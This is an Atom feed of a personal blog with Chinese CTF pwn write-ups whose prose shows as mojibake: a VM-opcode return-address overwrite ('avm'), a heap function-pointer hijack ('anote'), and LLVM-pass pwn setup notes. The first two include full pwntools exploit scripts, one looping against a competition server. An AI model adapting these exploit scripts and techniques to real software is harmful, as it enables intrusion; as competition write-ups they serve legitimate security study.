<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://l1u66.github.io/</id>
    <title>L1u66&apos;s blog</title>
    <updated>2024-12-17T15:31:18.282Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://l1u66.github.io/"/>
    <link rel="self" href="https://l1u66.github.io/atom.xml"/>
    <subtitle>ä¸–é—´ä¸‡èˆ¬å…µåˆƒï¼Œå”¯æœ‰è¿‡å¾€ä¼¤äººæœ€æ·±</subtitle>
    <logo>https://l1u66.github.io/images/avatar.png</logo>
    <icon>https://l1u66.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, L1u66&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[ciscnæš¨é•¿åŸæ¯]]></title>
        <id>https://l1u66.github.io/post/ciscn-ji-chang-cheng-bei/</id>
        <link href="https://l1u66.github.io/post/ciscn-ji-chang-cheng-bei/">
        </link>
        <updated>2024-12-15T14:39:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="avm">avm</h1>
<p>vmå®ç°äº†+ã€-ã€*ã€/ã€^ã€&amp;ã€å·¦ç§»ã€å³ç§»ã€å°†æ ˆä¸Šçš„åœ°å€å†™ä¸€ä¸ªåˆ°bssä¸Šçš„qword_40C0ä¸Šã€å°†qword_40C0å†™ä¸€ä¸ªåˆ°æ ˆä¸Šçš„åœ°å€ï¼ŒæŒ¨ä¸ªè¿›è¡Œé€†å‘åˆ†æå‚æ•°å’ŒæŒ‡ä»¤è¯†åˆ«ç </p>
<h2 id="vmè¿è¡Œ">vmè¿è¡Œ</h2>
<p><img src="https://l1u66.github.io//post-images/1734274709780.png" alt="" loading="lazy"><br>
å…¶ä¸­a1æ˜¯qword_40C0ï¼Œå…¶ä¸­a1[32]æ˜¯å½“å‰æŒ‡ä»¤ä½ç½®ï¼Œa1[33]æ˜¯opcodeé¦–åœ°å€ï¼Œa1[34]æ˜¯opcodeæœ€å¤§å­—èŠ‚æ•°å³0x300<br>
<img src="https://l1u66.github.io//post-images/1734274843890.png" alt="" loading="lazy"><br>
å’Œ-4æŒ‰ä½ä¸ååªèƒ½æ˜¯4çš„å€æ•°ï¼Œä»¥å››ä¸ªå­—èŠ‚å–å‡ºopcodeååˆå³ç§»äº†28ä½ä½œä¸ºäº†è¯†åˆ«æŒ‡ä»¤çš„æ ‡è¯†ï¼Œå‡å¦‚å››ä¸ªå­—èŠ‚ä¸º<code>\x12\x34\x56\x78</code>é‚£ä¹ˆä¹Ÿå°±æ˜¯0x78563412ï¼Œå³ç§»28ä½ä¹Ÿå°±æ˜¯7ï¼Œæ‰€ä»¥å°±æ­¤å¾—çŸ¥å¦‚ä½•æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„å‡½æ•°</p>
<h2 id="åŠ ">åŠ </h2>
<p><img src="https://l1u66.github.io//post-images/1734274357809.png" alt="" loading="lazy"><br>
åé¢å°±æ˜¯åŠ¨é™ç»“åˆçœ‹ä¸‹opcodeçš„ä½¿ç”¨</p>
<pre><code>  v2 = *(_DWORD *)(*(_QWORD *)(a1 + 0x108) + (*(_QWORD *)(a1 + 0x100) &amp; 0xFFFFFFFFFFFFFFFCLL));
  *(_QWORD *)(a1 + 0x100) += 4LL;
</code></pre>
<p>è¿™ä¸¤è¡Œç”¨ä½œå–å‡ºå½“å‰çš„opcodeï¼Œå†æŒ‡å‘ä¸‹ä¸€ä¸ªopcode<br>
<code>(a1 + 8LL * (v2 &amp; 0x1F)</code>qword_40C0çš„ä¸‹æ ‡æ˜¯ç”±ç¬¬ä¸€ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯\x12å†³å®šçš„ï¼Œ\x12æ˜¯å†™åˆ°qword_40C0ä¸‹æ ‡ä¸º12çš„åœ°æ–¹ï¼Œå¦‚æœæ˜¯\x22é‚£ä¹ˆä¸‹æ ‡å°±æ˜¯2ï¼Œç”±äºæ˜¯å’Œ0x1fæŒ‰ä½ä¸ï¼Œæ‰€ä»¥ä¸‹æ ‡å‰é¢æœ‰æ²¡æœ‰1å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯\x12é«˜4ä½æ˜¯å¦ä¸ºå¥‡æ•°<br>
<code>(a1 + 8LL * (HIWORD(v2) &amp; 0x1F))</code>ç¬¬ä¸€ä¸ªæ“ä½œæ•°ã€‚HIWORDå¯ä»¥å½“åšæ˜¯å§opcodeå‘å³ç§»ä¸¤ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯\x56ï¼Œå†å’Œ0x1fæŒ‰ä½ä¸ï¼Œé‚£ä¹ˆä¸‹æ ‡å°±æ˜¯16çš„ä½ç½®<br>
<code>(a1 + 8LL * ((v2 &gt;&gt; 5) &amp; 0x1F))</code>ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚æœ‰ä¸ªv2 &gt;&gt; 5å°±å’Œå‰ä¸¤ä¸ªå­—èŠ‚æœ‰å…³äº†ï¼Œå…·ä½“å¯ä»¥ç”¨è®¡ç®—å™¨ï¼Œå‡å¦‚å¦‚æœæƒ³ç”¨7åšä¸‹æ ‡ï¼Œé‚£ä¹ˆè®©7å·¦ç§»5ä½å¾—åˆ°0xe0ï¼Œé‚£ä¹ˆå°±éœ€è¦æ§åˆ¶å‰ä¸¤ä¸ªå­—èŠ‚ä¸º\xe?\x00æˆ–è€…\xf?\x00ï¼Œè¿™é‡Œ0xeæ˜¯å¶æ•°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸‹æ ‡å°±æ˜¯?ï¼Œ0xfæ˜¯å¥‡æ•°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸‹æ ‡æ˜¯1?</p>
<h2 id="å‰å…«ä¸ªæ“ä½œæ•°">å‰å…«ä¸ªæ“ä½œæ•°</h2>
<p>å‰å…«ä¸ªæ“ä½œæ•°éƒ½ç±»ä¼¼ï¼Œå’ŒåŠ æ³•ç±»æ¯”å³å¯</p>
<h2 id="ç¬¬ä¹ä¸ªç¬¬åä¸ªæ“ä½œæ•°-ä»¥åŠåˆ©ç”¨æ–¹å¼">ç¬¬ä¹ä¸ªç¬¬åä¸ªæ“ä½œæ•° ä»¥åŠåˆ©ç”¨æ–¹å¼</h2>
<p><img src="https://l1u66.github.io//post-images/1734276255383.png" alt="" loading="lazy"><br>
åŠ¨æ€è°ƒè¯•å‘ç°æ­¤å¤„a2æ˜¯æ ˆä¸Šçš„åœ°å€ï¼Œè¯¥åŠŸèƒ½æ˜¯æŠŠqword_40C0ä¸Šçš„æ•°æ®å†™åˆ°æ ˆä¸ŠæŒ‡å®šçš„ä½ç½®<br>
<img src="https://l1u66.github.io//post-images/1734276379794.png" alt="" loading="lazy"><br>
è¯¥åŠŸèƒ½æ˜¯æŠŠæ ˆä¸ŠæŒ‡å®šçš„ä½ç½®çš„æ•°æ®å†™åˆ°qword_40C0ä¸Š<br>
ç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ³„éœ²åœ°å€çš„åœ°æ–¹ï¼Œæ‰€ä»¥å°±åˆ©ç”¨æ–¹æ³•å°±å¯ä»¥çŒœå‡ºï¼Œå…ˆæŠŠæ ˆä¸Šçš„libcç›¸å…³åœ°å€å†™åˆ°qword_40C0ä¸Šï¼Œç„¶åå†é€šè¿‡åŠ å‡ä¹˜é™¤å·¦ç§»å³ç§»ç­‰æ–¹å¼æŠŠè¯¥åœ°å€æ”¹æˆogï¼Œç„¶åå†æŠŠæ ˆä¸Šçš„è¿”å›åœ°å€ä¿®æ”¹æˆogå³å¯ï¼Œä½†æ˜¯ç»è¿‡æ ˆä¸ŠæŸ¥æ‰¾ï¼Œå‘ç°æ²¡æœ‰ç¦»ogè¾ƒè¿‘çš„åœ°å€ï¼Œæ‰€ä»¥ç†è®ºä¸Šå°±éœ€è¦çˆ†ç ´ä¸€ä¸ªåŠå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯16<em>16</em>16åˆ†ä¹‹ä¸€çš„æ¦‚ç‡ï¼Œä½†æ˜¯å®é™…ä¸Šå¾ˆå¥½çˆ†ï¼ˆï¼ˆï¼ˆï¼Œåé¢ä¸»è¦å°±æ˜¯æ„é€ ogçš„è¿‡ç¨‹äº†ï¼Œç”±äºçŠ¯äº†ä¸€äº›é€†å¤©æ“ä½œï¼Œå¯¼è‡´æ¯”èµ›æ²¡å‡ºæ¥ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ï¼Œæ•´ä¸ªæŠ‘éƒä½äº†</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# elf=ELF('./pwn')
# libc=elf.libc
# # p = remote('39.105.55.245', 24653)
# p=process('./pwn')

# #        cebd3f
# payload = b'\x11\x22\xb8\xa6'  #ä¼ å…¥libcåœ°å€
# payload += b'\x10\x22\xc0\xa4'  #ä¼ å…¥1
# payload += b'\xa5\x20\x10\x14'  #ä¼ å…¥1
# payload += b'\x13\x22\x10\x14'  #ç›¸åŠ å¾—å‡ºå³ç§»ä½æ•°24
# payload += b'\x12\x22\x13\x14' #ç•™å¥‡æ•°
# payload += b'\x13\x22\x13\x14'*22  #10 + 13 -&gt;13
# payload += b'\x10\x22\x11\x14'
# payload += b'\x11\x22\x13\x80' #å³ç§»
# payload += b'\x20\x22\x13\x70' #å·¦ç§» 11å¤„
# payload += b'\x63\x22\x13\x34'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x63\x22\x13\x34'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x62\x20\x13\x34'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x43\x20\x12\x34'  #ç›¸xå¾—å‡ºpadding
# payload += b'\x63\x20\x12\x34'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x64\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x86\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\xc7\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\xe8\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x09\x01\x06\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\x2a\x01\x03\x10'*2  #ç›¸+å¾—å‡ºpadding
# payload += b'\x48\x01\x02\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\x09\x01\x02\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\x2a\x01\x02\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\x4a\x01\x02\x10'*7  #ç›¸+å¾—å‡ºpadding
# payload += b'\x41\x02\x13\x30'  #ç›¸Ã—å¾—å‡ºpadding
# payload += b'\x4a\x01\x01\x20'*0x75  #ç›¸-å¾—å‡ºpadding
# payload += b'\x4a\x01\x13\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\x4a\x01\x12\x10'*5  #ç›¸+å¾—å‡ºpadding
# payload += b'\xa7\x00\x05\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\xeb\x00\x13\x70' #å·¦ç§»
# payload += b'\x6b\x01\x05\x80' #å³ç§»
# payload += b'\x6b\x01\x12\x80' #å³ç§»
# payload += b'\x4a\x01\x0b\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\x51\x01\x00\x10'  #ç›¸+å¾—å‡ºpadding
# payload += b'\xd1\x22\x18\x91' # 11æ˜¯å †å—ä¸­çš„ä¸‹æ ‡ \x18\x91 ä½ç½®åœ¨æ ˆä¸Š118ä¹Ÿå°±æ˜¯éœ€è¦ä¿®æ”¹çš„è¿”å›åœ°å€
# gdb.attach(p,'b *$rebase(0x00000000000175D)')
# p.sendafter(&quot;opcode: &quot;,payload)
# p.sendafter('Unsupported instruction','cat flag')
# p.sendline('cat flag')

# p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

rnd = 0
while True:
    try:
        p = remote('39.105.55.245', 24653)
        # p=process('./pwn')
        rnd += 1
        li('the ' + str(rnd) + ' round')
        
        payload = b'\x11\x22\xb8\xa6'  #ä¼ å…¥libcåœ°å€
        payload += b'\x10\x22\xc0\xa4'  #ä¼ å…¥1
        payload += b'\xa5\x20\x10\x14'  #ä¼ å…¥1
        payload += b'\x13\x22\x10\x14'  #ç›¸åŠ å¾—å‡ºå³ç§»ä½æ•°24
        payload += b'\x12\x22\x13\x14' #ç•™å¥‡æ•°
        payload += b'\x13\x22\x13\x14'*22  #10 + 13 -&gt;13
        payload += b'\x10\x22\x11\x14'
        payload += b'\x11\x22\x13\x80' #å³ç§»
        payload += b'\x20\x22\x13\x70' #å·¦ç§» 11å¤„
        payload += b'\x63\x22\x13\x34'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x63\x22\x13\x34'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x62\x20\x13\x34'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x43\x20\x12\x34'  #ç›¸xå¾—å‡ºpadding
        payload += b'\x63\x20\x12\x34'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x64\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x86\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\xc7\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\xe8\x00\x12\x30'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x09\x01\x06\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\x2a\x01\x03\x10'*2  #ç›¸+å¾—å‡ºpadding
        payload += b'\x48\x01\x02\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\x09\x01\x02\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\x2a\x01\x02\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\x4a\x01\x02\x10'*7  #ç›¸+å¾—å‡ºpadding
        payload += b'\x41\x02\x13\x30'  #ç›¸Ã—å¾—å‡ºpadding
        payload += b'\x4a\x01\x01\x20'*0x75  #ç›¸-å¾—å‡ºpadding
        payload += b'\x4a\x01\x13\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\x4a\x01\x12\x10'*5  #ç›¸+å¾—å‡ºpadding
        payload += b'\xa7\x00\x05\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\xeb\x00\x13\x70' #å·¦ç§»
        payload += b'\x6b\x01\x05\x80' #å³ç§»
        payload += b'\x6b\x01\x12\x80' #å³ç§»
        payload += b'\x4a\x01\x0b\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\x51\x01\x00\x10'  #ç›¸+å¾—å‡ºpadding
        payload += b'\xd1\x22\x18\x91' # 11æ˜¯å †å—ä¸­çš„ä¸‹æ ‡ \x18\x91 ä½ç½®åœ¨æ ˆä¸Š118ä¹Ÿå°±æ˜¯éœ€è¦ä¿®æ”¹çš„è¿”å›åœ°å€
        p.sendafter(&quot;opcode: &quot;,payload)
        # p.sendafter('Unsupported instruction','cat flag')
        p.interactive()

    except EOFError:
        p.close()
        continue
</code></pre>
<h1 id="anote">anote</h1>
<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1734277338936.png" alt="" loading="lazy"></figure>
<p>å‘ç°<code>(**(void (__cdecl ***)(_DWORD))*(&amp;v25 + v20))(*(&amp;v25 + v20));</code></p>
<p>showåŠŸèƒ½ç»™å‡ºäº†å †å—åœ°å€<br>
<img src="https://l1u66.github.io//post-images/1734277332950.png" alt="" loading="lazy"></p>
<p>å‘ç°æ¯æ¬¡editä¹‹åéƒ½ä¼šcallè¿™ä¸ªåœ°å€æŒ‡å‘çš„åœ°å€</p>
<p>åŠ¨æ€è°ƒè¯•åå‘ç°åœ¨editå‰ä¸€ä¸ªå †å—æ—¶å¯ä»¥ä¿®æ”¹å½“å‰å †å—çš„è¯¥åœ°å€</p>
<p>äº‹å…ˆåœ¨å †å—é‡Œå†™å…¥åé—¨åœ°å€ï¼Œç„¶ååœ¨è¿™ä¸ªåœ°å€å†™å…¥å­˜æ”¾åé—¨åœ°å€çš„å †å—åœ°å€å³å¯è°ƒç”¨åé—¨å‡½æ•°</p>
<pre><code>from pwn import *
context(arch='i386', os='linux', log_level='debug')
elf=ELF('./note')
libc=elf.libc
#io=remote('47.94.216.142',32962)
io=process('./note')
 
def cmd(choice):
    io.recvuntil(b&quot;Choice&gt;&gt;&quot;)
    io.sendline(str(choice).encode())
 
def add() :
    cmd(1)
 
def show(idx):
    cmd(2)
    io.recvuntil(b&quot;index: &quot;)
    io.sendline(str(idx).encode())
 
def edit(idx,size,content='a') :
    cmd(3)
    io.recvuntil(b&quot;index: &quot;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&quot;len: &quot;)
    io.sendline(str(size).encode())
    io.recvuntil(b&quot;content: &quot;)
    io.sendline(content)


backdoor = 0x80489CE
add()
add()
show(0)
io.recvuntil(&quot;0x&quot;)
sys = int(io.recv(7),16)
gdb.attach(io)
edit(0,40,b'a'*20 + p32(backdoor) + p32(sys + 0x1c))
print(&quot;sys = &quot;,hex(sys))

edit(1,40,b'a'*24)

io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[LLVM-pwn]]></title>
        <id>https://l1u66.github.io/post/llvm-pwn/</id>
        <link href="https://l1u66.github.io/post/llvm-pwn/">
        </link>
        <updated>2024-12-10T14:55:35.000Z</updated>
        <content type="html"><![CDATA[<p><a href="https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1">https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1</a></p>
<h1 id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</h1>
<p><code>sudo apt install clang-12 clang-8 llvm-12 llvm-8</code></p>
<h1 id="ç¼–è¯‘">ç¼–è¯‘</h1>
<p><code>clang-12 -emit-llvm -S exp.cpp -o exp.ll</code></p>
<h1 id="è¿è¡Œ">è¿è¡Œ</h1>
<p><code>opt-12 -load ./xxx.so -æ ‡è¯†ç¬¦ ./exp.ll</code></p>
<h1 id="cå‡½æ•°åä¿®é¥°è§„åˆ™">c++å‡½æ•°åä¿®é¥°è§„åˆ™</h1>
<p>ä½¿ç”¨gccæˆ–clangç¼–è¯‘c++æ—¶ä¼šç»è¿‡åç§°ä¿®é¥°çš„è¿‡ç¨‹ä»è€Œæ”¹å˜å‡½æ•°åï¼Œä¿®é¥°åçš„åç§°é€šå¸¸åŒ…æ‹¬ï¼š<br>
_Zï¼šä¿®é¥°åç§°çš„å¼€å§‹</p>
<p>Nï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–é™æ€æˆå‘˜å‡½æ•°</p>
<p>æ•°å­—ï¼šè¡¨ç¤ºå‡½æ•°åç§°çš„é•¿åº¦</p>
<p>ç±»åå’Œå‡½æ•°åï¼šç»è¿‡ç¼–ç çš„ç±»åå’Œå‡½æ•°å</p>
<p>Eï¼šå‚æ•°åˆ—è¡¨çš„å¼€å§‹</p>
<p>å‚æ•°ç±»å‹ï¼šé€šè¿‡ä¸åŒçš„å­—æ¯æŒ‰é¡ºåºè¡¨ç¤ºå‚æ•°ç±»å‹</p>
<table>
<thead>
<tr>
<th style="text-align:center">å­—æ¯</th>
<th style="text-align:center">å‚æ•°ç±»å‹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">i</td>
<td style="text-align:center">int</td>
</tr>
<tr>
<td style="text-align:center">j</td>
<td style="text-align:center">unsigned int</td>
</tr>
<tr>
<td style="text-align:center">l</td>
<td style="text-align:center">long</td>
</tr>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">long long</td>
</tr>
<tr>
<td style="text-align:center">m</td>
<td style="text-align:center">unsigned long</td>
</tr>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">char</td>
</tr>
<tr>
<td style="text-align:center">h</td>
<td style="text-align:center">unsigned char</td>
</tr>
<tr>
<td style="text-align:center">b</td>
<td style="text-align:center">bool</td>
</tr>
<tr>
<td style="text-align:center">ç»“å°¾ï¼šåŒ…å«é¢å¤–ä¿¡æ¯å¦‚è¿”å›ç±»å‹</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>ä¾‹å¦‚_ZN4edoc4addiEhiiè¡¨ç¤ºåœ¨edocç±»ä¸­çš„å‡½æ•°åé•¿åº¦ä¸º4çš„å‡½æ•°addiï¼Œå®ƒçš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯unsigned charã€intã€intç±»å‹</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p><img src="https://l1u66.github.io//post-images/1733843158994.png" alt="" loading="lazy"><br>
é¢˜ç›®ç»™å‡ºäº†codeVM.soå’Œopt-12ä»¥åŠld-linux-x86-64.so.2å’Œlibc.so.6ï¼Œéœ€è¦é€†å‘åˆ†æçš„æ˜¯code.soæ–‡ä»¶ï¼ŒåŠ¨æ€è°ƒè¯•æ—¶ç”¨çš„æ˜¯opt-12</p>
<h1 id="åŠ¨æ€è°ƒè¯•">åŠ¨æ€è°ƒè¯•</h1>
<p>ä½¿ç”¨<code>gdb opt-12</code>è¿›è¡Œè°ƒè¯•ï¼Œå¹¶ä¸”é€šè¿‡<code>set args -load ./codeVM.so -Co00o0oOd3 ./exp.ll -f</code>å¯¼å…¥å‚æ•°ï¼Œåœ¨<code>main</code>å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œè‡³æ‰€æœ‰llvm::initializeå‰ç¼€çš„åˆå§‹åŒ–å‡½æ•°ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œ<br>
<img src="https://l1u66.github.io//post-images/1733843559366.png" alt="" loading="lazy"><br>
ä½¿ç”¨<code>vmmap</code>è·å–xxx.soçš„åŸºå€ï¼Œé€šè¿‡IDAä¸­çš„åç§»ä¸‹æ–­ç‚¹è¿›è¡Œè¿›ä¸€æ­¥è°ƒè¯•ï¼ˆå¦‚æœæ²¡æœ‰åŸºå€è¯´æ˜åˆå§‹èƒ¡å‡½æ•°è¿˜æ²¡è¿è¡Œå®Œ<br>
å…¶ä¸­Co00o0oOd3æ˜¯åœ¨_cxx_global_var_init_17å‡½æ•°ä¸­<br>
<img src="https://l1u66.github.io//post-images/1733843473097.png" alt="" loading="lazy"><br>
åœ¨<code>_data_rel_ro</code>æ®µå¯ä»¥æ‰¾åˆ°ç¨‹åºå…¥å£<br>
<img src="https://l1u66.github.io//post-images/1733843735739.png" alt="" loading="lazy"><br>
<img src="https://l1u66.github.io//post-images/1733843758487.png" alt="" loading="lazy"><br>
æ˜“æ¨æ–­å‡º<br>
<code>llvm::Value::getName();</code>ç”¨äºè·å–å‡½æ•°å<br>
<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>ç”¨äºæ¯”è¾ƒå‡½æ•°å<br>
æ‰€ä»¥å¯ä»¥é€šè¿‡åœ¨<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>å¤„ä¸‹æ–­ç‚¹æ¥æ‰¾å‡ºç¨‹åºå‡½æ•°å<br>
<img src="https://l1u66.github.io//post-images/1733843967112.png" alt="" loading="lazy"><br>
è¿™é‡Œè·å¾—codeVM.soçš„åŸºå€ï¼Œç„¶ååŠ ä¸Š<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>åœ¨codeVM.soä¸­çš„åç§»å³å¯<br>
<img src="https://l1u66.github.io//post-images/1733844073046.png" alt="" loading="lazy"><br>
è¿™é‡Œçš„æµ‹è¯•å‡½æ•°æ˜¯testfunctionç»è¿‡å‡½æ•°åä¿®é¥°æˆä¸º_Z12testfunctionvï¼Œå¯ä»¥çœ‹å‡ºç¨‹åºå…¥å£å‡½æ•°éœ€è¦è¢«ä¿®é¥°ä¸º_Z10c0deVmMainvæ‰€ä»¥å¾—åˆ°ï¼Œç¨‹åºå…¥å£å‡½æ•°ååº”è¯¥æ˜¯c0deVmMain</p>
<p>è¿›å…¥vmrunå‡½æ•°</p>
<pre><code>__int64 __fastcall `anonymous namespace'::c0oo0o0Ode::vmRun(
        _anonymous_namespace_::c0oo0o0Ode *this,
        llvm::Function *a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  llvm::BasicBlock *v4; // rax
  llvm::BasicBlock *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // [rsp+10h] [rbp-40h] BYREF
  __int64 v15; // [rsp+18h] [rbp-38h] BYREF
  __int64 v16; // [rsp+20h] [rbp-30h] BYREF
  char v17[8]; // [rsp+28h] [rbp-28h] BYREF
  __int64 v18; // [rsp+30h] [rbp-20h] BYREF
  char v19[8]; // [rsp+38h] [rbp-18h] BYREF
  llvm::Function *v20; // [rsp+40h] [rbp-10h]
  _anonymous_namespace_::c0oo0o0Ode *v21; // [rsp+48h] [rbp-8h]

  v21 = this;
  v20 = a2;
  v2 = llvm::errs(this);
  llvm::raw_ostream::operator&lt;&lt;(v2, &quot;Talk is cheap. Show me the code!\n&quot;);
  v18 = llvm::Function::end(a2);
  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::ilist_iterator&lt;false&gt;(
    v19,
    &amp;v18,
    0LL);
  v16 = llvm::Function::begin(v20);
  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::ilist_iterator&lt;false&gt;(
    v17,
    &amp;v16,
    0LL);
  while ( 1 )
  {
    result = llvm::operator!=(v17, v19);
    if ( (result &amp; 1) == 0 )
      break;
    v4 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator-&gt;(v17);
    v15 = llvm::BasicBlock::begin(v4);
    v5 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator-&gt;(v17);
    v14 = llvm::BasicBlock::end(v5);
    while ( (llvm::operator!=(&amp;v15, &amp;v14) &amp; 1) != 0 )
    {
      v6 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 0LL);
      if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v6) &amp; 1) != 0 )
      {
        `anonymous namespace'::c0oo0o0Ode::op1(this, &amp;v15);
      }
      else
      {
        v7 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 1LL);
        if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v7) &amp; 1) != 0 )
        {
          `anonymous namespace'::c0oo0o0Ode::op2(this, &amp;v15);
        }
        else
        {
          v8 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 2LL);
          if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v8) &amp; 1) != 0 )
          {
            `anonymous namespace'::c0oo0o0Ode::op3(this, &amp;v15);
          }
          else
          {
            v9 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 3LL);
            if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v9) &amp; 1) != 0 )
            {
              `anonymous namespace'::c0oo0o0Ode::op4(this, &amp;v15);
            }
            else
            {
              v10 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 4LL);
              if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v10) &amp; 1) != 0 )
              {
                `anonymous namespace'::c0oo0o0Ode::op5(this, &amp;v15);
              }
              else
              {
                v11 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 5LL);
                if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v11) &amp; 1) != 0 )
                {
                  `anonymous namespace'::c0oo0o0Ode::op6(this, &amp;v15);
                }
                else
                {
                  v12 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 6LL);
                  if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v12) &amp; 1) != 0 )
                  {
                    `anonymous namespace'::c0oo0o0Ode::op7(this, &amp;v15);
                  }
                  else
                  {
                    v13 = std::vector&lt;std::string&gt;::operator[](&amp;`anonymous namespace'::ops[abi:cxx11], 7LL);
                    if ( (`anonymous namespace'::c0oo0o0Ode::isValidOp(this, &amp;v15, v13) &amp; 1) != 0 )
                      `anonymous namespace'::c0oo0o0Ode::op8(this, &amp;v15);
                  }
                }
              }
            }
          }
        }
      }
      llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator++(&amp;v15);
    }
    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator++(v17);
  }
  return result;
}
</code></pre>
